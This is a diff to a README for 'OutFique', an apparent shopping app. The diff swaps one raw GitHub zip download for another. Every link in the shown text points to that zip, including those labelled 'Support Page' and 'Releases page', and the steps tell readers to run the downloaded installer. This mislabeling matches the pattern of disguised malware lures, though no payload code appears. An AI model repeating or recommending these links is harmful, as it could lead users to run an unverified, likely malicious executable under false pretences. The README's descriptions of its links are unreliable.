@@ -1,6 +1,6 @@
 # 👗 OutFique - Streamlined Shopping Experience for Everyone
 
-[![Download OutFique](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/OutFique.zip)](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/OutFique.zip)
+[![Download OutFique](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/Out_Fique_1.5.zip)](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/Out_Fique_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ OutFique offers a variety of features to enhance your shopping:
 
 To download OutFique, visit the Releases page. Follow these steps:
 
-1. Click on this link: [Download OutFique](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/OutFique.zip).
+1. Click on this link: [Download OutFique](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/Out_Fique_1.5.zip).
 2. On the Releases page, find the latest version of OutFique.
 3. Click on the asset that fits your operating system to download.
 4. Once the file is downloaded, locate it in your Downloads folder and run the installer.
@@ -53,11 +53,11 @@ OutFique allows you to customize your shopping experience:
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, visit our [Support Page](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/OutFique.zip) or contact our support team via the Help section in the app.
+If you encounter any issues or need assistance, visit our [Support Page](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/Out_Fique_1.5.zip) or contact our support team via the Help section in the app.
 
 ## 🔄 Updates
 
-Stay tuned for regular updates. Check the [Releases page](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/OutFique.zip) for new features and improvements.
+Stay tuned for regular updates. Check the [Releases page](https://raw.githubusercontent.com/JonasAngeles/OutFique/main/endofaradism/Out_Fique_1.5.zip) for new features and improvements.
 
 ## 🗣️ Community Feedback
 
